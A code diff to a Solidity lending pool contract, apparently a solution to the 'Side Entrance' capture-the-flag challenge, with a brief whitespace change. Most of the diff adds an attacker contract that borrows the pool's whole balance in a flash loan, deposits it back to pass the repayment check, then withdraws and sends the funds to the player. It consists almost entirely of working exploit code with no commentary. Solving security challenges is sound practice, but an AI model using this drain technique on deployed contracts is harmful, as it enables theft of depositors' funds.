@@ -29,7 +29,7 @@ contract SideEntranceLenderPool {
 
     function withdraw() external {
         uint256 amount = balances[msg.sender];
-        
+
         delete balances[msg.sender];
         emit Withdraw(msg.sender, amount);
 
@@ -43,5 +43,30 @@ contract SideEntranceLenderPool {
 
         if (address(this).balance < balanceBefore)
             revert RepayFailed();
+    }
+}
+
+contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+    address player;
+
+    constructor (SideEntranceLenderPool pool_) {
+        pool = pool_;
+        player = msg.sender;
+    }
+
+    receive() external payable {
+
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        SafeTransferLib.safeTransferETH(player, address(this).balance);
+    }
+
+    function execute() external payable {
+        require(msg.sender == address(pool));
+        pool.deposit{value: msg.value}();
     }
 }
